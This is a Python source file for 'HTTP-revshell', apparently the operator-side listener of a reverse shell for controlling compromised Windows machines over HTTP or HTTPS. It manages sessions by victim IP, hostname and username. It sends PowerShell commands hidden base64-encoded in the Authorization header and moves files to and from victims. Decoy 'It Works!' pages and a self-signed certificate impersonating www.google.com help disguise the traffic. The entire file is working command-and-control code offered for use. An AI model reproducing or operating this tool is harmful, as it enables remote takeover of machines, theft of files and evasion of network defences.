#!/usr/bin/python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from termcolor import colored
import urllib.parse
import time
import readline
import ssl
import argparse
import json
from pynput.keyboard import Key, Controller
import signal
from datetime import datetime, date
from OpenSSL import crypto, SSL
from os import path
from prettytable import PrettyTable

readline.parse_and_bind("tab: complete")
CLIENT_DICT = {}
CURRENT_CLIENT = ""
KEY_PULSED = False

class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        html = "<html><body><h1>It Works!</h1></body></html>"
        client = self.client_address[0]
        
        result, parser_type, json_response, color = self.parseResult()
        self.controlNewClients(client, json_response)
        pwd = self.getPwd(json_response)

        if client == CURRENT_CLIENT:
            if (self.isDownloadFunctCalled(json_response)):
                filename, file_content, output = self.parseDownload(json_response)
                functions = Functions()
                functions.download(filename, file_content, output)
            else:
                if ((json_response["result"] != json_response["pwd"]) and 
                ("InvokeWebRequestCommand" not in result) and
                ("WebCmdletWebResponseException" not in result)):
                    self.printResult(result, color)

            try:
                if (parser_type == "newclient"):
                    command = self.newCommand(pwd, True)
                elif ("InvokeWebRequestCommand" in result):
                    command = self.newCommand(pwd, False, True)
                else:
                    command = self.newCommand(pwd)
                self.sendCommand(command, html)
            except BrokenPipeError:
                pass
        if (parser_type == "newclient"):
            command = self.newCommand(pwd, True)
            self.sendCommand(command, html)
        return
        
    def controlNewClients(self, client, json_response):
        if (client not in CLIENT_DICT):
            hostname = base64.b64decode(json_response["hostname"]).decode('utf-8')
            username = base64.b64decode(json_response["cuser"]).decode('utf-8')
            
            if len(CLIENT_DICT) == 0:
                CLIENT_DICT[client] = {"session":1, "hostname":hostname, "username":username}
            else:
                CLIENT_DICT[client] = {"session":list(CLIENT_DICT.items())[-1][1]["session"] + 1, "hostname":hostname, "username":username}

        if len(CLIENT_DICT) == 1:
            global CURRENT_CLIENT
            CURRENT_CLIENT = list(CLIENT_DICT.keys())[0] 

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        data = json.loads(test_data.decode('uft-8'))
        parser_type = data["type"]
        result = ""
        color = "white"
        client = self.client_address[0]

        if parser_type != "newclient":
            try:
                if (parser_type == "C0MM4ND"):
                    color = "white"
                elif (parser_type == "UPL04D" or parser_type == "D0WNL04D"):
                    color = "green"
                elif (parser_type == "3RR0R"):
                    color = "red"
                
                result = urllib.parse.unquote(data["result"])
                result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            input(colored("[!] New Connection from {}, please press ENTER!".format(client),'red'))
        
        return result, parser_type, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def printResult(self, result, color):
        print(colored(result, color))

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd, newclient=False, reconnect=False):
        command = ""
        try:
            if pwd != "":
                if (not newclient) and (not reconnect):
                    command = input(colored("PS {}> ".format(pwd), "blue"))
                if command == "":
                    command = "pwd | Format-Table -HideTableHeaders"
            else:
                command = "pwd | Format-Table -HideTableHeaders"
        except EOFError:
            global KEY_PULSED
            KEY_PULSED = True
        return command

    def sendCommand(self, command, html, content=""):
        if (command != ""):
            command_list = command.split(" ")
            if (command_list[0] == "upload"):
                functions = Functions()
                try:
                    if (len(command_list) == 3 or command[-1] == '"'):
                        if '"' in command_list[1]:
                            filename = command.split('"')[1]
                        else:
                            filename = command_list[1]
                    elif ('"' in command_list[1]):
                        filename = command.split('"')[1]
                        
                    content = functions.upload(filename)
                    html = content.decode('utf-8')
                except (AttributeError, IndexError, UnboundLocalError) as e:
                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
            elif (command_list[0] == "download"):
                try:
                    download = command_list[0]
                    srcFile = command_list[1]
                    dstFile = command_list[2]
                except IndexError:
                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                    print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
                    
            elif (command.split(" ")[0]) == "exit":
                # Delete current client from CLIENT_DICT
                global CLIENT_DICT
                global CURRENT_CLIENT
                del CLIENT_DICT[CURRENT_CLIENT]
                if len(CLIENT_DICT) > 0:
                    CURRENT_CLIENT = list(CLIENT_DICT.keys())[0]
                    print(colored("[*] Session has been closed", "green"))
                    print(colored("[!] WARNING: Session been changed to {}!".format(CURRENT_CLIENT), "yellow"))

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())


class Functions():
    def upload(self, filename):
        try:
            with open(filename, mode='rb') as file: # b is important -> binary
                content = file.read()
                return base64.b64encode(content)
        except FileNotFoundError:
            print (colored("\r\n[!] Source file not found!", "red"))

    def download(self, filename, content, output):
        try:
            with open(filename, mode='wb') as file: # b is importante -> binary
                content = base64.b64decode(content)
                file.write(content)
                print(colored(output, "green"))
        except:
            print (colored("\r\n[!] Error: Writing file!", "red"))


class Certificate():
    def checkCertificateExpiration(self):
        expired = False

        cert = crypto.load_certificate(crypto.FILETYPE_PEM, open('certificate/cacert.pem', 'rt').read())
        cert_date = datetime.strptime(cert.get_notAfter().decode('utf-8'),"%Y%m%d%H%M%SZ")
        today = date.today()
        current_date = today.strftime("%Y-%m-%d")

        if str(current_date) == str(cert_date).split(" ")[0]:
            expired = True
        return expired

    def genCertificate(self, KEY_FILE="certificate/private.pem", CERT_FILE="certificate/cacert.pem"):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 4096)

        cert = crypto.X509()
        cert.get_subject().C = "UK"
        cert.get_subject().ST = "London"
        cert.get_subject().L = "London"
        cert.get_subject().O = "Development"
        cert.get_subject().CN = "www.google.com"
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(31557600)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        with open(CERT_FILE, "wt") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
        with open(KEY_FILE, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))

    def checkCertPath(self):
        exist = False
        if (path.exists("certificate/cacert.pem") and path.exists("certificate/private.pem")):
            exist = True
        return exist

class Readline_functions():
    def completer(self, text, state):
        main_commands = ["help", "exit", "sessions", "interact"]
        options = [i for i in main_commands if i.startswith(text)]
        if state < len(options):
            return options[state]
        else:
            return None

    def main_help_banner(self):
        print("\n")
        print("Available commands to use :\n")
        print("+++++++++")
        print("help  \t\t\t\tShow this help menu")
        print("sessions  \t\t\tList all active sessions")
        print("interact {session_id}  \t\tInteract with a session. Example: interact 1")
        print("exit \t\t\t\tClose the server")
        print("\n")


class Menu():
    def printSessionTable(self):
        t = PrettyTable(["Session ID", "IP", "Username", "Hostname"])
        for client in CLIENT_DICT.keys():
            t.add_row([CLIENT_DICT[client]["session"], client, CLIENT_DICT[client]["username"], CLIENT_DICT[client]["hostname"]])
        print(colored(t.get_string(title="Sessions"), "green"))

    def construct_menu(self, menu, server):
        if menu[0] == "sessions":
            #server.handle_request()
            self.printSessionTable()

        elif menu[0] == "exit":
            server.server_close()
            exit(0)

        elif menu[0] == "help":
            rf = Readline_functions()
            rf.main_help_banner()
        
        elif menu[0] == "interact":
            if len(CLIENT_DICT) == 0:
                print(colored("[!] Sorry, there are no clients!", "red"))
            else:
                try:
                    global CURRENT_CLIENT
                    for client in list(CLIENT_DICT.keys()):
                        if CLIENT_DICT[client]["session"] == int(menu[1]):
                            CURRENT_CLIENT = client
                    while True:
                        global KEY_PULSED
                        if KEY_PULSED:
                            KEY_PULSED = False
                            break
                        request, client_address = server.get_request()

                        if CURRENT_CLIENT == client_address[0]:
                            if server.verify_request(request,client_address):
                                server.process_request(request,client_address)
                        else:
                            server.finish_request(request, client_address)
                except ValueError:
                    print (colored("[!] Session number {} doesn't exist".format(menu[1]), "red"))

def handler(signum, frame):
    pass

if __name__ == "__main__":
    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (colored(banner, 'yellow'))
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
        signal.signal(signal.SIGQUIT, handler)

        if (args.ssl):
            cert = Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        server.handle_request()
        rf = Readline_functions()
        menu = Menu()
        while True:
            readline.set_completer(rf.completer)
            readline.parse_and_bind("tab: complete")

            menu_command = input(colored("\nHTTP-revshell> ", "yellow")).split(" ")
            menu.construct_menu(menu_command, server)

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.server_close()
